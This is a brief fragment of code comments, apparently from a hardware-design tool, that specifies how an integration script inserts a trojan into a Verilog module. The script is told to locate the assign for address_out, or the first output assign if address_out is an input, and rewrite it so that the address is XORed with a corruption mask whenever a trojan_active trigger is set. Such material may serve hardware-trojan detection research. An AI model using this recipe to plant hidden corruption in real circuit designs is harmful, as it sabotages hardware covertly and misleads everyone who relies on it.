...
//
// IMPORTANT: address_out may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If address_out is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for address_out (or first output assign):
//     assign address_out = <expr>;
//   Replace with:
//     assign address_out = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
